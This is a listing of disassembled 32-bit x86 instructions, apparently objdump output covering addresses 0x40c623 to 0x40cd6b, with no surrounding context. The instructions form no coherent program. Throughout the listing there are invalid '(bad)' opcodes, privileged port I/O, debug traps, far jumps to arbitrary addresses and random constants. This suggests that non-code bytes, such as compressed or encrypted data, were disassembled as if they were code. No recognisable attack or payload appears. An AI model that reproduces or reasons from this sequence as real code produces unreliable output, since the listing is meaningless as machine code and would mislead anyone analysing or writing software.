  40c623:	out    0x3,eax
  40c625:	rcr    BYTE PTR [esi-0x6d930468],cl
  40c62b:	data16 lods al,BYTE PTR fs:[esi]
  40c62e:	cmp    eax,DWORD PTR [edx]
  40c630:	sub    BYTE PTR [eax],cl
  40c632:	jno    0x40c5f9
  40c634:	dec    edi
  40c635:	pop    esp
  40c636:	enter  0x3f,0x1c
  40c63a:	addr16 enter 0xbe2c,0x1d
  40c63f:	gs jb  0x40c6af
  40c642:	in     al,0xb8
  40c644:	ror    edi,cl
  40c646:	out    0xc0,al
  40c648:	cmc    
  40c649:	inc    esp
  40c64a:	jae    0x40c682
  40c64c:	mov    ebx,0xde83e3c2
  40c651:	jecxz  0x40c613
  40c653:	inc    edx
  40c654:	xlat   BYTE PTR ds:[ebx]
  40c655:	xor    ebx,edx
  40c657:	ins    DWORD PTR es:[edi],dx
  40c658:	jl     0x40c6af
  40c65a:	mov    ecx,0xc7446b94
  40c65f:	in     eax,0xaf
  40c661:	xor    al,0xb
  40c663:	scas   eax,DWORD PTR es:[edi]
  40c664:	push   edi
  40c665:	push   ss
  40c666:	retf   
  40c667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c668:	sahf   
  40c669:	mov    eax,ds:0x7ff4a19e
  40c66e:	dec    esi
  40c66f:	cmp    DWORD PTR ds:0x561de180,0x467fb2f2
  40c679:	mov    edx,DWORD PTR [ecx+eiz*8]
  40c67c:	push   0xffffffc1
  40c67e:	xor    al,0xe2
  40c680:	stos   BYTE PTR es:[edi],al
  40c681:	mov    ch,0x7a
  40c683:	les    esi,FWORD PTR [ebx]
  40c685:	mov    dl,0x4
  40c687:	in     al,dx
  40c688:	icebp  
  40c689:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c68a:	add    ebp,DWORD PTR [esi]
  40c68c:	push   0x28
  40c68e:	mov    ebp,DWORD PTR gs:[ecx]
  40c691:	xchg   ecx,eax
  40c692:	mov    ebp,0x8b6dff36
  40c697:	mov    ds:0x9833232,eax
  40c69c:	out    0x3e,al
  40c69e:	cdq    
  40c69f:	mov    WORD PTR [edi-0x18edc965],gs
  40c6a5:	inc    eax
  40c6a6:	push   esi
  40c6a7:	add    al,0x94
  40c6a9:	jo     0x40c650
  40c6ab:	stc    
  40c6ac:	jns    0x40c6ac
  40c6ae:	or     bh,BYTE PTR [ecx]
  40c6b0:	repz sbb DWORD PTR [ecx],edi
  40c6b3:	lock or eax,0x15cf878c
  40c6b9:	cmp    eax,0xdce69964
  40c6be:	xor    ebp,DWORD PTR [esi]
  40c6c0:	inc    ebx
  40c6c1:	imul   esp,DWORD PTR [ecx+0x3b],0xa9ada2ad
  40c6c8:	cs (bad) 
  40c6ca:	mov    ah,0x89
  40c6cc:	jo     0x40c6f3
  40c6ce:	mov    esp,DWORD PTR [esi+esi*4+0x40]
  40c6d2:	adc    DWORD PTR [esi+0x24],ecx
  40c6d5:	lock or BYTE PTR [ecx+0x25],dl
  40c6d9:	call   0x240bd56e
  40c6de:	sbb    bl,ah
  40c6e0:	dec    edx
  40c6e1:	les    edx,FWORD PTR [esi-0x43]
  40c6e4:	inc    esi
  40c6e5:	dec    ebp
  40c6e6:	enter  0x52cf,0xc4
  40c6ea:	call   0x7ee4baa2
  40c6ef:	mov    edi,0x86a3d10f
  40c6f4:	rcr    DWORD PTR [ebx+0x4c],0xec
  40c6f8:	imul   edx,DWORD PTR [eax+ebp*8-0x21c6adfc],0xfefc4b3
  40c703:	xor    ebx,ecx
  40c705:	icebp  
  40c706:	cmp    BYTE PTR [ebp+ebx*4+0x4b],ah
  40c70a:	clc    
  40c70b:	fsub   DWORD PTR [edi+ecx*8+0x3d]
  40c70f:	mov    ah,0xb2
  40c711:	loop   0x40c723
  40c713:	(bad)  
  40c714:	jnp    0x40c6ab
  40c716:	xor    dl,BYTE PTR [ebx]
  40c718:	rol    esi,1
  40c71a:	enter  0x3c34,0x9
  40c71e:	(bad)  
  40c71f:	sbb    ah,bl
  40c721:	adc    esi,esp
  40c723:	dec    eax
  40c724:	sahf   
  40c725:	in     al,dx
  40c726:	sbb    ecx,DWORD PTR [ecx+0xd]
  40c729:	sbb    esi,eax
  40c72b:	lahf   
  40c72c:	or     al,0x95
  40c72e:	mov    al,ds:0x331cadcc
  40c733:	sub    al,0xf1
  40c735:	jmp    0x4e96b513
  40c73a:	sub    DWORD PTR [eax-0x8],esi
  40c73d:	(bad)  
  40c73e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c73f:	cmp    DWORD PTR [eax+0x5579a1d1],0x0
  40c746:	adc    ah,BYTE PTR [esi]
  40c748:	pop    ecx
  40c749:	repz sahf 
  40c74b:	xchg   esi,eax
  40c74c:	loop   0x40c791
  40c74e:	lea    edi,[ecx-0x6fcdd02a]
  40c754:	pusha  
  40c755:	ins    BYTE PTR es:[edi],dx
  40c756:	retf   
  40c757:	or     BYTE PTR [ecx+0x4fef8b2a],0x76
  40c75e:	push   es
  40c75f:	das    
  40c760:	push   esp
  40c761:	ret    
  40c762:	rcl    DWORD PTR [esi],1
  40c764:	(bad)  [esi]
  40c766:	retf   
  40c767:	clc    
  40c768:	out    dx,al
  40c769:	or     al,0xce
  40c76b:	mov    ebp,0x60bc0c10
  40c770:	sbb    DWORD PTR [ebx],edi
  40c772:	xchg   esi,eax
  40c773:	ins    BYTE PTR es:[edi],dx
  40c774:	inc    ebp
  40c775:	or     eax,0xe895b377
  40c77a:	dec    ebx
  40c77b:	stc    
  40c77c:	jno    0x40c735
  40c77e:	vpcmpgtb ymm3,ymm6,YMMWORD PTR [eax+0x67]
  40c783:	push   ss
  40c784:	in     al,0xa0
  40c786:	stos   DWORD PTR es:[edi],eax
  40c787:	daa    
  40c788:	sbb    BYTE PTR [ebx*1+0x123ca800],bh
  40c78f:	lea    edi,cs:[ecx-0x1d7c230b]
  40c796:	jg     0x40c7c0
  40c798:	and    bl,0x9c
  40c79b:	aas    
  40c79c:	lea    esi,[edx-0x2b1de5a4]
  40c7a2:	mov    esp,0x6d4801de
  40c7a7:	pop    esi
  40c7a8:	ret    
  40c7a9:	mov    ds:0x90025bef,al
  40c7ae:	push   ebp
  40c7af:	ins    BYTE PTR es:[edi],dx
  40c7b0:	(bad)  
  40c7b1:	sub    eax,0xab2b193e
  40c7b6:	mov    ebx,0x4939d693
  40c7bb:	mov    esp,ebp
  40c7bd:	or     DWORD PTR [ecx-0x46c5f623],ecx
  40c7c3:	js     0x40c76d
  40c7c5:	add    eax,0x17aabff4
  40c7ca:	adc    BYTE PTR [ecx],bl
  40c7cc:	js     0x40c7e2
  40c7ce:	(bad)  
  40c7cf:	fcomp  QWORD PTR [edx+0x22]
  40c7d2:	lds    esp,FWORD PTR [eax-0xc073c4f]
  40c7d8:	imul   DWORD PTR ds:0x4971bba9
  40c7de:	icebp  
  40c7df:	cmp    BYTE PTR [edx-0x5c],ch
  40c7e2:	gs add al,0x84
  40c7e5:	inc    ecx
  40c7e6:	cwde   
  40c7e7:	fcom   DWORD PTR [ecx]
  40c7e9:	shl    DWORD PTR [edx+0x70],cl
  40c7ec:	ret    0x9a6b
  40c7ef:	xchg   esi,eax
  40c7f0:	call   0x83f6:0x456f17de
  40c7f7:	mov    eax,eax
  40c7f9:	push   eax
  40c7fa:	jl     0x40c86e
  40c7fc:	cmp    DWORD PTR [edi+eiz*2-0x30],ecx
  40c800:	sahf   
  40c801:	popa   
  40c802:	or     eax,0x482dba2
  40c807:	sbb    BYTE PTR [ecx],0xcb
  40c80a:	(bad)  [ebx-0xb]
  40c80d:	ss ret 
  40c80f:	jge    0x40c7b3
  40c811:	fs sbb al,0xd9
  40c814:	and    DWORD PTR [edi-0x31],esp
  40c817:	xchg   esp,eax
  40c818:	std    
  40c819:	iret   
  40c81a:	ss jae 0x40c874
  40c81d:	or     al,0xe1
  40c81f:	in     eax,dx
  40c820:	pop    eax
  40c821:	push   cs
  40c822:	lods   eax,DWORD PTR ds:[esi]
  40c823:	xchg   ebx,eax
  40c824:	jmp    0x40c7d6
  40c826:	imul   edi,DWORD PTR [ebx-0x8],0xffffffb5
  40c82a:	push   ss
  40c82b:	push   ds
  40c82c:	sub    DWORD PTR [esi-0xd],ebp
  40c82f:	stos   BYTE PTR es:[edi],al
  40c830:	pusha  
  40c831:	retf   0xe008
  40c834:	or     eax,0x6ca42191
  40c839:	or     eax,0x3122d203
  40c83e:	ret    
  40c83f:	push   esi
  40c840:	mov    dh,0xfc
  40c842:	mov    DWORD PTR [ebp+0x29],eax
  40c845:	fs pop ss
  40c847:	sbb    eax,0x9cedc095
  40c84c:	mov    DWORD PTR [ebx-0x44],ebp
  40c84f:	cs into 
  40c851:	adc    DWORD PTR [ebp+eax*8+0x57],esp
  40c855:	jmp    FWORD PTR [ecx]
  40c857:	add    DWORD PTR [ebp+0x668fb007],esi
  40c85d:	xchg   esp,eax
  40c85e:	fld    DWORD PTR [esi-0x30d3e52f]
  40c864:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c865:	out    dx,al
  40c866:	(bad)  
  40c867:	jmp    0x69fd:0xf49e543a
  40c86e:	cli    
  40c86f:	into   
  40c870:	and    BYTE PTR [ebx],ah
  40c872:	dec    eax
  40c873:	mov    ah,0xbc
  40c875:	or     bh,BYTE PTR ds:0xfe2ce56f
  40c87b:	out    dx,al
  40c87c:	push   ebx
  40c87d:	mov    bh,0x70
  40c87f:	xchg   ecx,eax
  40c880:	inc    ecx
  40c881:	dec    esp
  40c882:	xor    eax,0xa789cfae
  40c887:	pop    ds
  40c888:	xor    DWORD PTR [eax+0x50],esi
  40c88b:	jb     0x40c8a8
  40c88d:	lods   eax,DWORD PTR ds:[esi]
  40c88e:	xor    eax,DWORD PTR ds:0x731a800a
  40c894:	mov    al,ds:0x56e3a465
  40c899:	ss push eax
  40c89b:	fcmovnbe st,st(1)
  40c89d:	mov    edx,ecx
  40c89f:	clc    
  40c8a0:	shl    DWORD PTR ds:0xb25f3d8b,1
  40c8a6:	mov    eax,0x40c1a95c
  40c8ab:	popa   
  40c8ac:	inc    esi
  40c8ad:	pop    edi
  40c8ae:	push   edi
  40c8af:	cmp    DWORD PTR [eax],edx
  40c8b1:	repz and esp,edi
  40c8b4:	mov    eax,0x8d2e6dfe
  40c8b9:	sti    
  40c8ba:	test   eax,0xa66f157f
  40c8bf:	jno    0x40c8a6
  40c8c1:	mov    ch,0xce
  40c8c3:	aaa    
  40c8c4:	scas   eax,DWORD PTR es:[edi]
  40c8c5:	(bad)  
  40c8c6:	xlat   BYTE PTR ds:[ebx]
  40c8c7:	(bad)  
  40c8c8:	dec    esp
  40c8c9:	lock je 0x40c90c
  40c8cc:	sub    eax,0x709ef406
  40c8d1:	sar    dh,0xad
  40c8d4:	xchg   esp,eax
  40c8d5:	pop    es
  40c8d6:	inc    ecx
  40c8d7:	pop    edi
  40c8d8:	xor    DWORD PTR [ecx],eax
  40c8da:	xchg   ecx,eax
  40c8db:	push   0x88b39511
  40c8e0:	je     0x40c86b
  40c8e2:	cmp    eax,0xbea2636c
  40c8e7:	or     al,0x93
  40c8e9:	pop    edx
  40c8ea:	adc    eax,0x86334d18
  40c8ef:	cs icebp 
  40c8f1:	in     eax,0x48
  40c8f3:	addr16 dec esp
  40c8f5:	rcl    BYTE PTR [ebx],0x46
  40c8f8:	cdq    
  40c8f9:	ds (bad) 
  40c8fb:	mov    esp,0xa8c7091f
  40c900:	lock imul DWORD PTR [ecx]
  40c903:	cmc    
  40c904:	rcl    DWORD PTR [ebp-0x33],1
  40c907:	sbb    ecx,edi
  40c909:	add    BYTE PTR [ebx+edx*4+0x4f351c2e],dh
  40c910:	inc    esi
  40c911:	or     ah,BYTE PTR [ebx]
  40c913:	sbb    dh,BYTE PTR [esp+ebx*2-0xd]
  40c917:	and    ebp,DWORD PTR [ecx]
  40c919:	lods   al,BYTE PTR ds:[esi]
  40c91a:	int3   
  40c91b:	fdiv   st,st(1)
  40c91d:	jno    0x40c8d7
  40c91f:	popf   
  40c920:	and    edx,edx
  40c922:	dec    ebx
  40c923:	push   ecx
  40c924:	mov    eax,0x4c7c186f
  40c929:	fcmovu st,st(1)
  40c92b:	aam    0x45
  40c92d:	ret    
  40c92e:	adc    al,0x26
  40c930:	loop   0x40c8f6
  40c932:	mov    eax,0xa2a0ad23
  40c937:	ins    BYTE PTR es:[edi],dx
  40c938:	es mov bl,0x8c
  40c93b:	sub    BYTE PTR [ebp-0x19],0x2b
  40c93f:	rol    edi,1
  40c941:	xor    edi,DWORD PTR [ebp+0xf]
  40c944:	mov    ah,0xd0
  40c946:	push   ss
  40c947:	hlt    
  40c948:	pop    es
  40c949:	pop    edx
  40c94a:	sub    BYTE PTR [edx],ah
  40c94c:	(bad)  
  40c94e:	inc    edi
  40c94f:	(bad)  
  40c951:	js     0x40c94e
  40c953:	push   cs
  40c954:	ins    BYTE PTR es:[edi],dx
  40c955:	push   ebx
  40c956:	retf   
  40c957:	jle    0x40c963
  40c959:	fisttp DWORD PTR [esi]
  40c95b:	mov    ch,0x28
  40c95d:	fsub   st(3),st
  40c95f:	je     0x40c925
  40c961:	mov    dh,BYTE PTR [ebx]
  40c963:	cmp    BYTE PTR [edi-0x3a],0xab
  40c967:	mov    dh,0x1b
  40c969:	add    edi,ebp
  40c96b:	(bad)  
  40c96c:	cs inc eax
  40c96e:	es mov esi,0xea4fbb50
  40c974:	mov    edi,0x1d7b61c7
  40c979:	jns    0x40c9e1
  40c97b:	stc    
  40c97c:	adc    esp,DWORD PTR [ebx]
  40c97e:	sti    
  40c97f:	lods   eax,DWORD PTR ds:[esi]
  40c980:	inc    edi
  40c981:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c982:	ret    
  40c983:	sar    BYTE PTR [ebx+0x57],1
  40c986:	arpl   WORD PTR [ecx+0xbbeaf5e],bx
  40c98c:	mov    esp,0xab458060
  40c991:	stc    
  40c992:	add    DWORD PTR [ebx],0x285163c7
  40c998:	xor    DWORD PTR [edi-0x66],ecx
  40c99b:	sahf   
  40c99c:	repnz aad 0xe9
  40c99f:	loope  0x40c9d0
  40c9a1:	sub    DWORD PTR [eax],0x611ccd61
  40c9a7:	mov    dh,ch
  40c9a9:	leave  
  40c9aa:	ds clc 
  40c9ac:	test   BYTE PTR [esi+0x222eeff2],0x87
  40c9b3:	xor    ch,BYTE PTR [eax+0x11e82d31]
  40c9b9:	and    ebx,DWORD PTR [ecx-0x1c]
  40c9bc:	lds    ebp,FWORD PTR [ebx-0x6ad327e5]
  40c9c2:	push   eax
  40c9c3:	ror    DWORD PTR [esi-0x515a47ac],0x99
  40c9ca:	test   bl,ch
  40c9cc:	cmp    BYTE PTR [esi],cl
  40c9ce:	sub    dl,BYTE PTR [esi-0x69]
  40c9d1:	jbe    0x40c97a
  40c9d3:	sub    al,BYTE PTR [edi+0x0]
  40c9d6:	dec    edx
  40c9d7:	test   eax,0x112bfe40
  40c9dc:	lods   eax,DWORD PTR ds:[esi]
  40c9dd:	mov    esp,0x801d1c37
  40c9e2:	rol    BYTE PTR [edi+0x74],1
  40c9e5:	mov    al,ds:0x88d2baf8
  40c9ea:	cld    
  40c9eb:	sti    
  40c9ec:	addr16 clc 
  40c9ee:	xchg   ecx,eax
  40c9ef:	daa    
  40c9f0:	xchg   edi,eax
  40c9f1:	test   eax,0xaf18aa77
  40c9f6:	jge    0x40c9a2
  40c9f8:	mov    bl,0x3f
  40c9fa:	int3   
  40c9fb:	leave  
  40c9fc:	cmp    dh,cl
  40c9fe:	fcmovbe st,st(3)
  40ca00:	std    
  40ca01:	mov    ebp,0x967ef422
  40ca06:	xor    cl,bl
  40ca08:	in     eax,0x89
  40ca0a:	push   ebx
  40ca0b:	(bad)  
  40ca0c:	lock inc BYTE PTR [esi+0x45]
  40ca10:	in     al,dx
  40ca11:	fsubp  st(0),st
  40ca13:	icebp  
  40ca14:	inc    eax
  40ca15:	pop    eax
  40ca16:	inc    edi
  40ca17:	aam    0xec
  40ca19:	aaa    
  40ca1a:	bound  ebp,QWORD PTR [edi]
  40ca1c:	cmp    ecx,DWORD PTR [ecx+0x7d]
  40ca1f:	lods   eax,DWORD PTR ds:[esi]
  40ca20:	push   eax
  40ca21:	or     ecx,ebp
  40ca23:	int3   
  40ca24:	adc    dl,BYTE PTR [edi]
  40ca26:	and    BYTE PTR [esp+edx*2-0x7333d1e],ah
  40ca2d:	in     eax,0x9e
  40ca2f:	xor    BYTE PTR [ebx],bl
  40ca31:	mov    ebp,0xedb28441
  40ca36:	inc    eax
  40ca37:	add    al,0xdb
  40ca39:	mov    ds:0x4d4b5c5c,al
  40ca3e:	icebp  
  40ca3f:	or     DWORD PTR [edx+0x44],ebp
  40ca42:	add    BYTE PTR [ebx+esi*8-0x3d8cb1dc],cl
  40ca49:	mov    al,0xe1
  40ca4b:	sbb    dh,ah
  40ca4d:	dec    edi
  40ca4e:	sbb    esi,DWORD PTR [edi-0x5dbae1bb]
  40ca54:	fldcw  WORD PTR [edx+0x1d6af116]
  40ca5a:	inc    eax
  40ca5b:	xor    bh,BYTE PTR [edi-0x57]
  40ca5e:	cmp    bh,BYTE PTR [eax-0x4f806a7f]
  40ca64:	adc    esi,DWORD PTR [edx-0x12]
  40ca67:	fsubr  QWORD PTR [eax+0x4ced7846]
  40ca6d:	js     0x40ca28
  40ca6f:	imul   edi,DWORD PTR [esi+0x72],0x738198e3
  40ca76:	pop    es
  40ca77:	xchg   esp,eax
  40ca78:	repz dec esp
  40ca7a:	ins    BYTE PTR es:[edi],dx
  40ca7b:	adc    BYTE PTR [ebx],cl
  40ca7d:	jecxz  0x40ca87
  40ca7f:	aas    
  40ca80:	jmp    0x7ae2:0x27eb2130
  40ca87:	inc    ecx
  40ca88:	pop    edi
  40ca89:	ins    DWORD PTR es:[edi],dx
  40ca8a:	or     esp,DWORD PTR [esi+0x55]
  40ca8d:	arpl   dx,cx
  40ca8f:	hlt    
  40ca90:	lods   al,BYTE PTR ds:[esi]
  40ca91:	dec    esp
  40ca92:	cmc    
  40ca93:	pop    esp
  40ca94:	repz loope 0x40ca64
  40ca97:	mov    esp,0xdce5ced3
  40ca9c:	and    DWORD PTR [edx-0xa],ecx
  40ca9f:	mov    edi,0xc1f3210a
  40caa4:	(bad)  
  40caa5:	fild   DWORD PTR es:[edx-0x52001ff2]
  40caac:	(bad)  
  40caad:	push   ecx
  40caae:	mov    gs,WORD PTR [eax-0x3a]
  40cab1:	sub    DWORD PTR [eax],edi
  40cab3:	sub    BYTE PTR [edi-0x5e41009],bh
  40cab9:	stos   DWORD PTR es:[edi],eax
  40caba:	(bad)  [edx]
  40cabc:	jge    0x40cb07
  40cabe:	pop    edx
  40cabf:	add    eax,0x86ff3b4
  40cac4:	mov    eax,ds:0x2b33411
  40cac9:	in     al,0xe0
  40cacb:	gs (bad) 
  40cacd:	lahf   
  40cace:	cmp    cl,BYTE PTR [eax+0x136a4e34]
  40cad4:	mov    eax,0xdbf6f0c1
  40cad9:	add    DWORD PTR [ebx-0x4451b5e9],0xfffffff1
  40cae0:	mov    esp,0x536835b9
  40cae5:	and    bl,cl
  40cae7:	xor    eax,0xc41e3aa7
  40caec:	arpl   WORD PTR [eax+0x2ae10d99],bx
  40caf2:	and    al,0x27
  40caf4:	ins    DWORD PTR es:[edi],dx
  40caf5:	lds    ecx,FWORD PTR [edx]
  40caf7:	xor    BYTE PTR [ebx+0x1d],0x2f
  40cafb:	icebp  
  40cafc:	add    eax,0x2a026666
  40cb01:	out    0xb7,eax
  40cb03:	or     al,bh
  40cb05:	sbb    DWORD PTR [ecx+0xd820a5],eax
  40cb0b:	xchg   edi,eax
  40cb0c:	inc    edi
  40cb0d:	xchg   edi,eax
  40cb0e:	ror    DWORD PTR [ecx],cl
  40cb10:	push   ss
  40cb11:	(bad)  
  40cb13:	jp     0x40caf3
  40cb15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb16:	mov    BYTE PTR [eax+0x39],0x8a
  40cb1a:	inc    esi
  40cb1b:	ret    0x95e1
  40cb1e:	xchg   edi,eax
  40cb1f:	gs mov bh,0x52
  40cb22:	ins    DWORD PTR es:[edi],dx
  40cb23:	outs   dx,BYTE PTR ds:[esi]
  40cb24:	xor    dl,bh
  40cb26:	mov    ch,0x92
  40cb28:	push   ecx
  40cb29:	dec    edx
  40cb2a:	neg    BYTE PTR [esi]
  40cb2c:	xor    bh,BYTE PTR [esi-0x28c0c9c6]
  40cb32:	dec    eax
  40cb33:	pop    ebp
  40cb34:	fimul  WORD PTR [edi-0x57]
  40cb37:	jmp    0x40cae5
  40cb39:	adc    BYTE PTR [edi],bh
  40cb3b:	inc    ebx
  40cb3c:	lods   al,BYTE PTR ds:[esi]
  40cb3d:	jp     0x40cb7f
  40cb3f:	mov    esi,0x7be19ede
  40cb44:	test   ebx,esi
  40cb46:	xchg   DWORD PTR [eax+0x4f26af72],eax
  40cb4c:	push   ss
  40cb4d:	jno    0x40cb8f
  40cb4f:	lods   al,BYTE PTR ds:[esi]
  40cb50:	pop    ss
  40cb51:	dec    ebp
  40cb52:	outs   dx,DWORD PTR ds:[esi]
  40cb53:	retf   
  40cb54:	push   ecx
  40cb55:	dec    eax
  40cb56:	fld    TBYTE PTR [esi-0x7]
  40cb59:	mov    WORD PTR [ebx-0x38],es
  40cb5c:	or     BYTE PTR [ebx+0x27],0xa6
  40cb60:	push   eax
  40cb61:	xchg   ebx,eax
  40cb62:	dec    ebx
  40cb63:	jg     0x40cb37
  40cb65:	push   ds
  40cb66:	pop    edi
  40cb67:	int    0x64
  40cb69:	fs js  0x40cb3f
  40cb6c:	mov    ds:0xfa574f8c,al
  40cb71:	fs and al,0x46
  40cb74:	xchg   ebp,eax
  40cb75:	xlat   BYTE PTR ds:[ebx]
  40cb76:	sub    bh,bl
  40cb78:	mov    dl,0x4a
  40cb7a:	bound  ebp,QWORD PTR [edx-0x29]
  40cb7d:	icebp  
  40cb7e:	mov    cl,bh
  40cb80:	fdivr  DWORD PTR [esi-0x28eeb028]
  40cb86:	fcmovb st,st(6)
  40cb88:	sub    al,BYTE PTR [edi+ebp*4]
  40cb8b:	(bad)  
  40cb8c:	jmp    0x40cbc4
  40cb8e:	ja     0x40cbc0
  40cb90:	pushf  
  40cb91:	pop    es
  40cb92:	sar    BYTE PTR [edx],1
  40cb94:	adc    al,0xa8
  40cb96:	or     DWORD PTR [ebx-0x5a],0x4d3476e1
  40cb9d:	cld    
  40cb9e:	adc    esi,DWORD PTR [ecx+0x61]
  40cba1:	arpl   bx,bx
  40cba3:	test   esi,ebp
  40cba5:	scas   al,BYTE PTR es:[edi]
  40cba6:	cmp    esp,DWORD PTR [ebx+0x4c259099]
  40cbac:	and    edx,DWORD PTR [edi+0x1f1ac4f7]
  40cbb2:	arpl   di,cx
  40cbb4:	jge    0x40cbe5
  40cbb6:	das    
  40cbb7:	mov    ds:0xcfe56011,al
  40cbbc:	push   ss
  40cbbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbbe:	fs dec ebx
  40cbc0:	xor    esi,esi
  40cbc2:	fcomp  QWORD PTR [ebp-0x6]
  40cbc5:	and    edx,DWORD PTR [edx-0x102bccf8]
  40cbcb:	or     eax,0xb156ab26
  40cbd0:	xchg   edx,eax
  40cbd1:	sub    esp,edx
  40cbd3:	hlt    
  40cbd4:	fmul   DWORD PTR [esi+0x1f]
  40cbd7:	jecxz  0x40cb62
  40cbd9:	mov    ah,0x18
  40cbdb:	push   es
  40cbdc:	pop    ebx
  40cbdd:	sbb    edx,DWORD PTR [ecx]
  40cbdf:	inc    esp
  40cbe0:	pop    edx
  40cbe1:	push   edi
  40cbe2:	pop    ss
  40cbe3:	arpl   sp,sp
  40cbe5:	repz dec esi
  40cbe7:	xor    DWORD PTR [esi-0x62],ecx
  40cbea:	in     eax,dx
  40cbeb:	and    eax,ecx
  40cbed:	cld    
  40cbee:	jecxz  0x40cc3b
  40cbf0:	es ins DWORD PTR es:[edi],dx
  40cbf2:	adc    DWORD PTR [edx-0x7a652756],edx
  40cbf8:	xchg   esi,eax
  40cbf9:	inc    ebp
  40cbfa:	xchg   dl,cl
  40cbfc:	jmp    0x40cc2b
  40cbfe:	push   edx
  40cbff:	scas   al,BYTE PTR es:[edi]
  40cc00:	jbe    0x40cc02
  40cc02:	mov    esi,0xc71c182b
  40cc07:	pushf  
  40cc08:	bound  ebx,QWORD PTR [eax+0x6f]
  40cc0b:	(bad)  
  40cc0c:	jle    0x40cba8
  40cc0e:	gs in  eax,0x3d
  40cc11:	call   0xc49d:0x4d5b230e
  40cc18:	fldenv [edx+ebp*8-0x4]
  40cc1c:	fbstp  TBYTE PTR [ecx+0x6218ebad]
  40cc22:	mov    eax,ds:0x1e9e8c9
  40cc27:	push   esp
  40cc28:	jmp    0x21b2:0xc4a5bdb5
  40cc2f:	xchg   ebp,eax
  40cc30:	retf   
  40cc31:	cmp    DWORD PTR [ebp+0x41cc1e13],ecx
  40cc37:	add    eax,0x2929b428
  40cc3c:	lahf   
  40cc3d:	retf   0xefec
  40cc40:	pop    esi
  40cc41:	sbb    DWORD PTR [eax-0x54],ecx
  40cc44:	cmp    al,0xdb
  40cc46:	test   eax,0x331b1a6a
  40cc4b:	imul   esi,DWORD PTR [ebp-0x4c4eacc6],0x4b3acbe5
  40cc55:	lods   eax,DWORD PTR ds:[esi]
  40cc56:	jae    0x40cc7a
  40cc58:	in     al,0x8e
  40cc5a:	mov    BYTE PTR [ebp+0xe277ec0],cl
  40cc60:	mov    ebp,0xd4e996c2
  40cc65:	retf   
  40cc66:	push   ss
  40cc67:	jge    0x40cc7b
  40cc69:	iret   
  40cc6a:	ins    DWORD PTR es:[edi],dx
  40cc6b:	cdq    
  40cc6c:	je     0x40cca5
  40cc6e:	fisubr DWORD PTR [ecx-0x7a]
  40cc71:	lea    esi,[ebx]
  40cc73:	loope  0x40cca6
  40cc75:	mov    ds:0x843cef6b,al
  40cc7a:	icebp  
  40cc7b:	imul   ebx,DWORD PTR [esi+0x6b75c78a],0xf9d94a56
  40cc85:	mov    BYTE PTR [esi+0x78c60bc5],dl
  40cc8b:	inc    edi
  40cc8c:	mov    ds:0x8198677a,eax
  40cc91:	stc    
  40cc92:	push   esp
  40cc93:	ret    
  40cc94:	or     edx,DWORD PTR [eax-0x23bcf752]
  40cc9a:	jp     0x40ccc9
  40cc9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc9d:	arpl   WORD PTR [edx],ax
  40cc9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cca0:	cwde   
  40cca1:	mov    ebp,0x493be09a
  40cca6:	repnz mov eax,ds:0x56aa033e
  40ccac:	xchg   ecx,eax
  40ccad:	pop    eax
  40ccae:	das    
  40ccaf:	ret    0x994d
  40ccb2:	xor    al,BYTE PTR [eax-0x2d650a5f]
  40ccb8:	mov    al,ds:0xf561589c
  40ccbd:	xor    ecx,DWORD PTR [eax-0x7a]
  40ccc0:	shr    ebx,0x70
  40ccc3:	imul   ebp,esi,0x88203c04
  40ccc9:	rcr    DWORD PTR [edx],0x9f
  40cccc:	add    cl,bl
  40ccce:	mov    bl,0x10
  40ccd0:	dec    edi
  40ccd1:	xor    eax,0x5cb605d6
  40ccd6:	hlt    
  40ccd7:	pop    esi
  40ccd8:	fldcw  WORD PTR [esi+ecx*8]
  40ccdb:	dec    ebx
  40ccdc:	inc    esi
  40ccdd:	add    BYTE PTR [eax+edx*8-0x3e],ch
  40cce1:	repz dec edi
  40cce3:	adc    ch,BYTE PTR [ecx+0x73692b06]
  40cce9:	aas    
  40ccea:	push   ds
  40cceb:	pop    edx
  40ccec:	inc    ebp
  40cced:	dec    edx
  40ccee:	mov    edx,0x5395bce2
  40ccf3:	iret   
  40ccf4:	adc    DWORD PTR [eax+0x16f595af],edi
  40ccfa:	ret    
  40ccfb:	jg     0x40cd7c
  40ccfd:	push   esp
  40ccfe:	dec    ecx
  40ccff:	addr16 jmp 0x40cc9b
  40cd02:	nop
  40cd03:	(bad)  
  40cd04:	mov    cl,BYTE PTR [ebx-0x2b]
  40cd07:	pop    eax
  40cd08:	in     al,0x2b
  40cd0a:	xchg   esp,eax
  40cd0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd0c:	je     0x40ccee
  40cd0e:	je     0x40cca5
  40cd10:	sti    
  40cd11:	ret    
  40cd12:	dec    edx
  40cd13:	adc    eax,0xd567d1f8
  40cd18:	mov    bh,0xb0
  40cd1a:	inc    esp
  40cd1b:	jbe    0x40ccec
  40cd1d:	(bad)  
  40cd1e:	dec    ebx
  40cd1f:	out    dx,al
  40cd20:	dec    ecx
  40cd21:	mov    eax,0xd7547560
  40cd26:	xor    ch,BYTE PTR [ecx+0x58]
  40cd29:	mov    ebx,ecx
  40cd2b:	ins    BYTE PTR es:[edi],dx
  40cd2c:	jb     0x40ccc8
  40cd2e:	test   DWORD PTR [ecx-0x5f3f9541],0xd23aa81b
  40cd38:	dec    ecx
  40cd39:	ftst   
  40cd3b:	call   0x3173:0xdc3c4f79
  40cd42:	shl    BYTE PTR [ebx+0x22],cl
  40cd45:	add    eax,eax
  40cd47:	fldenv [edi]
  40cd49:	into   
  40cd4a:	sub    eax,0x3823eae4
  40cd4f:	fcomp  QWORD PTR [ecx+0x23ba20f3]
  40cd55:	out    dx,al
  40cd56:	adc    dl,BYTE PTR [edx-0x3b]
  40cd59:	cmp    eax,0x39cf3c1e
  40cd5e:	dec    esp
  40cd5f:	mov    ds:0x6c7dc5ac,al
  40cd64:	daa    
  40cd65:	mov    esp,0xc363263f
  40cd6a:	ins    BYTE PTR es:[edi],dx
  40cd6b:	iret   
